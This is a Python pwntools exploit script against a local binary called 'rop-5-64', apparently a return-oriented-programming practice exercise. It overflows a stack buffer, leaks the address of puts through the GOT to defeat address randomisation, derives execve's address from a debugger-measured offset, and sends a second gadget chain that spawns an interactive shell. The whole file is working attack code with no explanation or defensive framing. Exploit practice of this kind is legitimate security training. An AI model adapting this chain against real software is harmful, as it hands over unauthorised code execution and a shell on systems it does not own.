#!/usr/bin/env python

from pwn import *
import os

p = process('./rop-5-64')

puts_got = p.elf.got['puts']
puts_plt = p.elf.plt['puts']
input_func = p.elf.symbols['input_func']

print("GOT: %s" % hex(puts_got))
print ("PLT: %s" % hex(puts_plt))


buf = "A" * 0x80 + "BBBBBBBB"


"""
0x0000000000400763 : pop rdi ; ret
0x0000000000400688 : pop rdx ; nop ; pop rbp ; ret
0x0000000000400761 : pop rsi ; pop r15 ; ret

"""
pop_rdi_ret = p64(0x400763)
pop_rsi_pop_ret = p64(0x400761)
pop_rdx_pop_rbp_ret = p64(0x400688)


buf += pop_rdi_ret
buf += p64(puts_got)
buf += p64(puts_plt)

buf += p64(input_func)

print (buf)


print(p.recv())

with open("e.txt", "w") as f:
    f.write(buf)
    f.close

p.sendline(buf)

data = p.recv()
print(repr(data))

cut_data = data[ len(buf)-21:]
#print ("HHHH")
#print (len(buf))
#print (len(data))
#print (cut_data)

print_addr_raw = cut_data[:6]
print(print_addr_raw)
print_addr_raw += "\x00\x00"

printf_addr = u64(print_addr_raw)
print(hex(printf_addr))

"""
pwndbg> print puts
$4 = {<text variable, no debug info>} 0x7fb704184690 <_IO_puts>
pwndbg> print execve
$5 = {<text variable, no debug info>} 0x7fb7041e1770 <execve>
"""

offset = 0x7fb7041e1770 - 0x7fb704184690  #execve - puts
execve_addr = printf_addr + offset

buf = "A" * 0x80 + "BBBBBBBB"

buf += pop_rdi_ret
buf += p64(0x400894)
buf += pop_rsi_pop_ret
buf += p64(0) + p64(0)
buf += pop_rdx_pop_rbp_ret
buf += p64(0) + p64(0)

buf += p64(execve_addr)

#0x400894 = d


with open("e.txt", "w") as f:
    f.write(buf)
    f.close

p.sendline(buf)
p.interactive()
